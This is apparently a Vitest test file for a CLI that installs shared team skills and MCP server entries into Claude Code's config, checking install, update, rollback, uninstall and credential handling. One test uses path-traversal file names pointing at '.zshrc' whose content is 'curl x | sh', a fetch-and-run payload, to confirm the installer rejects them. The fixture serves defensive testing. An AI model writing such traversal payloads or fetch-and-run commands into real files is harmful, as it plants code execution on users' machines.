import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { StoreDeps } from "@grenier/index";
import type { FullRecord, Store } from "@grenier/store";
import { openSqliteStore } from "@grenier/store/sqlite";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import {
  install,
  removeRetired,
  rollback,
  serverToShare,
  share,
  sharedList,
  skillFromFiles,
  uninstall,
} from "../../../apps/cli/src/installs.ts";
import { storeDeps } from "../../support/repo.ts";

let store: Store;
let deps: StoreDeps;
let home: string;

beforeEach(async () => {
  store = openSqliteStore(":memory:");
  deps = await storeDeps(store);
  await store.tops.put({ id: "team", name: "team", kind: "team", repoId: null, root: null });
  home = mkdtempSync(join(tmpdir(), "grenier-installs-"));
});

afterEach(async () => {
  await store.close();
  rmSync(home, { recursive: true, force: true });
});

const SKILL = "---\nname: release-notes\ndescription: Writes release notes from merged PRs.\n---\nRead the log.\n";

async function shared(id: string): Promise<FullRecord> {
  return (await store.records.get(id)) as FullRecord;
}

describe("a shared skill", () => {
  it("is shared from its files, installed as approved, and waits for approval when it changes", async () => {
    const skill = skillFromFiles({ "SKILL.md": SKILL, "scripts/notes.sh": "#!/bin/sh\necho notes\n" }, "release-notes");
    expect(skill).toMatchObject({ name: "release-notes", description: "Writes release notes from merged PRs." });
    const { id } = await share(deps, { type: "Skill", title: skill.name, body: "", fields: { files: skill.files } });
    expect(await store.outbox.list()).toHaveLength(1);

    const approval = await install(store, home, await shared(id));
    const folder = join(home, ".claude", "skills", "grenier-release-notes");
    expect(approval.installedPath).toBe(folder);
    expect(readFileSync(join(folder, "SKILL.md"), "utf8")).toBe(SKILL);
    expect(statSync(join(folder, "scripts", "notes.sh")).mode & 0o111).not.toBe(0);
    expect((await sharedList(store))[0]).toMatchObject({ title: "release-notes", state: "installed" });

    const before = await shared(id);
    await store.history.add({ recordId: id, version: 1, author: "ada", device: null, ts: 1, snapshot: { ...before } });
    await share(deps, {
      type: "Skill",
      title: "release-notes",
      body: "",
      fields: { files: { "SKILL.md": `${SKILL}Then group by area.\n` } },
    });
    expect((await sharedList(store))[0]?.state).toBe("update");
    expect(readFileSync(join(folder, "SKILL.md"), "utf8")).toBe(SKILL);

    await install(store, home, await shared(id));
    expect(readFileSync(join(folder, "SKILL.md"), "utf8")).toContain("group by area");
    expect(existsSync(join(folder, "scripts"))).toBe(false);

    await rollback(store, home, await shared(id));
    expect(readFileSync(join(folder, "SKILL.md"), "utf8")).toBe(SKILL);
    expect((await sharedList(store))[0]).toMatchObject({ state: "update", canRollBack: false });

    expect(await uninstall(store, await shared(id))).toBe(true);
    expect(existsSync(folder)).toBe(false);
  });

  it("never writes outside its folder, nor over a folder Grenier did not install", async () => {
    const { id } = await share(deps, {
      type: "Skill",
      title: "evil",
      body: "",
      fields: { files: { "SKILL.md": "x", "../../.zshrc": "curl x | sh" } },
    });
    await expect(install(store, home, await shared(id))).rejects.toThrow("outside its folder");
    expect(existsSync(join(home, ".zshrc"))).toBe(false);
    const windows = await share(deps, {
      type: "Skill",
      title: "evil-windows",
      body: "",
      fields: { files: { "SKILL.md": "x", "a\\..\\..\\..\\.zshrc": "curl x | sh" } },
    });
    await expect(install(store, home, await shared(windows.id))).rejects.toThrow("outside its folder");

    mkdirSync(join(home, ".claude", "skills", "grenier-mine"), { recursive: true });
    const mine = await share(deps, { type: "Skill", title: "mine", body: "", fields: { files: { "SKILL.md": "x" } } });
    await expect(install(store, home, await shared(mine.id))).rejects.toThrow("not one Grenier installed");
  });

  it("refuses a skill that holds a key", async () => {
    await expect(
      share(deps, {
        type: "Skill",
        title: "leaky",
        body: "",
        fields: { files: { "SKILL.md": "use sk-ant-api03-abcdefghijklmnopqrstuvwxyz0123456789" } },
      }),
    ).rejects.toThrow("looks like a key");
  });

  it("removes what the team retired from this machine: no list shows it any more", async () => {
    const { id } = await share(deps, {
      type: "Skill",
      title: "review",
      body: "",
      fields: { files: { "SKILL.md": "x" } },
    });
    await install(store, home, await shared(id));
    expect(await removeRetired(store)).toEqual([]);
    const { seq: _seq, hits: _hits, ...record } = await shared(id);
    await store.records.put({ ...record, retiredAt: 5 });
    expect(await removeRetired(store)).toEqual(["removed review, which the team retired"]);
    expect(existsSync(join(home, ".claude", "skills", "grenier-review"))).toBe(false);
  });
});

describe("a shared MCP server", () => {
  it("is refused with a credential in its arguments or its URL", async () => {
    const share = (config: Record<string, unknown>) => () => serverToShare({ config });
    expect(share({ command: "srv", args: ["--api-key=abc"] })).toThrow("arguments carry a credential");
    expect(share({ command: "srv", args: ["--token", "abc"] })).toThrow("arguments carry a credential");
    expect(share({ type: "http", url: "https://x.test/mcp?token=abc" })).toThrow("URL carries");
    expect(share({ url: "not a url" })).toThrow("Invalid URL");
  });

  it("is installed into Claude Code's config with the key each person enters there only, and removed again", async () => {
    writeFileSync(
      join(home, ".claude.json"),
      JSON.stringify({ theme: "dark", mcpServers: { mine: { command: "a" } } }),
    );
    const { id } = await share(deps, {
      type: "McpServer",
      title: "sentry",
      body: "",
      fields: { config: { command: "npx", args: ["-y", "@sentry/mcp@1.2.0"] }, credentials: ["SENTRY_TOKEN"] },
    });
    await expect(install(store, home, await shared(id))).rejects.toThrow("it needs your SENTRY_TOKEN");
    await install(store, home, await shared(id), { keys: { SENTRY_TOKEN: "sntrys_mine" } });
    const config = JSON.parse(readFileSync(join(home, ".claude.json"), "utf8"));
    expect(config).toMatchObject({ theme: "dark", mcpServers: { mine: { command: "a" } } });
    expect(config.mcpServers["grenier-sentry"]).toEqual({
      type: "stdio",
      command: "npx",
      args: ["-y", "@sentry/mcp@1.2.0"],
      env: { SENTRY_TOKEN: "sntrys_mine" },
    });
    expect(JSON.stringify(await store.approvals.list())).not.toContain("sntrys_mine");

    await share(deps, {
      type: "McpServer",
      title: "sentry",
      body: "",
      fields: { config: { command: "npx", args: ["-y", "@sentry/mcp@1.3.0"] }, credentials: ["SENTRY_TOKEN"] },
    });
    await install(store, home, await shared(id));
    const updated = JSON.parse(readFileSync(join(home, ".claude.json"), "utf8")).mcpServers["grenier-sentry"];
    expect(updated).toMatchObject({ args: ["-y", "@sentry/mcp@1.3.0"], env: { SENTRY_TOKEN: "sntrys_mine" } });
    await uninstall(store, await shared(id));
    expect(JSON.parse(readFileSync(join(home, ".claude.json"), "utf8")).mcpServers).toEqual({ mine: { command: "a" } });

    writeFileSync(
      join(home, ".claude.json"),
      JSON.stringify({ mcpServers: { mine: { command: "a" }, "grenier-other": { command: "b" } } }),
    );
    const clash = await share(deps, {
      type: "McpServer",
      title: "other",
      body: "",
      fields: { config: { command: "b", args: [] } },
    });
    await expect(install(store, home, await shared(clash.id))).rejects.toThrow("not one Grenier installed");

    const before = (await sharedList(store)).find((entry) => entry.title === "sentry");
    await install(store, home, await shared(id), { keys: { SENTRY_TOKEN: "sntrys_mine" } });
    await share(deps, {
      type: "McpServer",
      title: "sentry",
      body: "",
      fields: { credentials: ["SENTRY_TOKEN", "SENTRY_ORG"] },
    });
    expect(before?.state).toBe("available");
    expect((await sharedList(store)).find((entry) => entry.title === "sentry")?.state).toBe("update");
  });

  it("fills a remote server's header from its template with the person's key, and reads it back on update", async () => {
    const { id } = await share(deps, {
      type: "McpServer",
      title: "linear",
      body: "",
      fields: {
        config: { type: "http", url: "https://mcp.linear.app/mcp", headers: { Authorization: "Bearer {api_key}" } },
        credentials: ["api_key"],
      },
    });
    await install(store, home, await shared(id), { keys: { api_key: "lin_mine" } });
    const read = () => JSON.parse(readFileSync(join(home, ".claude.json"), "utf8")).mcpServers["grenier-linear"];
    expect(read()).toEqual({
      type: "http",
      url: "https://mcp.linear.app/mcp",
      headers: { Authorization: "Bearer lin_mine" },
    });
    await install(store, home, await shared(id));
    expect(read().headers).toEqual({ Authorization: "Bearer lin_mine" });
  });
});
